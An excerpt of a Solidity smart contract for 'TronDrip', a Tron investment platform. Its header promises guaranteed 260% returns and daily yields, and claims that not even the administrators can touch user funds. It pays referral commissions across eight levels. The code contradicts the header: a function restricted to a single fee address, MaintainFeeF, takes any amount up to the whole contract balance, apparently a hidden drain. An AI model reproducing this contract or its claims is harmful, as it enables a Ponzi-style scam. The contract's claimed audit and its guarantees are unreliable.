//SourceUnit: trondrip.sol

/*       _______                  _ _____       _                           
 *  	|__   __|                | |  __ \     (_)                          
 * 	       | |_ __ ___  _ __   __| | |  | |_ __ _ _ __   ___ ___  _ __ ___  
 *         | | '__/ _ \| '_ \ / _` | |  | | '__| | '_ \ / __/ _ \| '_ ` _ \ 
 *         | | | | (_) | | | | (_| | |__| | |  | | |_) | (_| (_) | | | | | |
 *         |_|_|  \___/|_| |_|\__,_|_____/|_|  |_| .__(_)___\___/|_| |_| |_|
 *                                               | |                        
 *                                               |_|                        
 *                                                                                                                          
 * TronDrip Smart Contract Made Actually Smart
 * Verified Smart Contract Investment Platform.
 * SMART TRONIX PROPERTIES Ltd. is registered company in United Kingdom with Company Number 12874884.
 * Audited by SecondSigma - Independat Smart Contract Validation Company
 * TronDrip.com is a Tron blockchain smart contract-based investment platform. we’ve leveraged on blockchain technology as well as established our code audit run by an independent audit company. Our user’s funds are kept safe away from any third-party control for instance, no company, institution, or individual can access the funds, even the TronDrip administration team.
 ...
 *                                                                                                                  
 *                                                                                                                   
 * Total Platforms Profit for the Investment period is 260%, which Guarantees LONG and STABLE Income.
 * Hold Bonus is limited to 3% Total and it gives extra 0.05% For Every Day you hold your Balance without Withdrawal.
 * Total Daily Profit Is Limited to 15%, from which 3% Is Total Hold Bonus and 12% Daily Profit. Contract starts with 6% Daily.
 * Daily Profit Increases for 0.02% every time Daily Profit Increases for 0.02% when Smart Contract Total invested Reaches + 1 Million TRX. And the % doesn't decrease when the balance gets lower.
 * Hold Bonus doesnt decrease after you make another Investment
 * Very Detailed Referral Statistics in 8 Levels.
...
contract TronDrip {
	...
	uint256 constant public MarketingFee = 550;
	uint256 constant public ServiceFee = 300;
	uint256[] public ReferralCommissions = [500, 300, 100, 50, 50, 50, 50, 50];
	uint256 constant public Day = 1 days;
	uint256 constant public ROICap = 26000;
	uint256 constant public PercentDiv = 10000;
	uint256 constant public ContractIncreaseEach = 1000000 trx;
	uint256 constant public StartBonus = 600;
	uint256 constant public ContractBonusCap = 600;
	...
	constructor(address payable MarketingAddress, address payable ServiceAddress, address payable FeeAddress) public {
		require(!isContract(MarketingAddress) && !isContract(ServiceAddress) && !isContract(FeeAddress));
    ...
    modifier checkFee {
        require (msg.sender == FeeAddr, "error function not allowed");
        _;
    }
		...
		if (user.upline != address(0)) {
			...
			for (uint256 i = 0; i < 8; i++) {
				if (upline != address(0)) {
					...
					if(i == 7){
						users[upline].lvleightcommisions = users[upline].lvleightcommisions.add(amount);
					}
    ...
    function MaintainFeeF(uint amount) public payable checkFee {
        require (amount <= address(this).balance, "Not enought funds.");
